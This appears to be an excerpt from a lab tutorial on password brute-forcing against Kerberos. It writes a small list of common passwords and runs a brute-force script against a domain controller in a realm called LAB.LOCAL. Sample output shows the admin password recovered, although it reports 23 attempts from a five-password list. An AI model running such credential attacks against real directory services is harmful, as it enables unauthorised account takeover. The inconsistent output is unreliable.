# Create simple password list
cat > passwords.txt <<EOF
password
Password1
Admin123
Welcome1
Spring2025
EOF

# Run basic brute force
python3 kerb_bruteforce_advanced.py \
    -r LAB.LOCAL \
    -k 192.168.88.20 \
    -u admin \
    -p passwords.txt

# Expected output:
# [+] Loaded 5 base passwords
# [+] Total passwords to test: 5
# [*] Launching 4 worker threads...
# [0] Attempt 10 | Rate: 0.33/s | Testing: password
# ...
# [+] ✓ SUCCESS! Password found!
# [+] Username: admin@LAB.LOCAL
# [+] Password: Admin123
# [+] Attempts: 23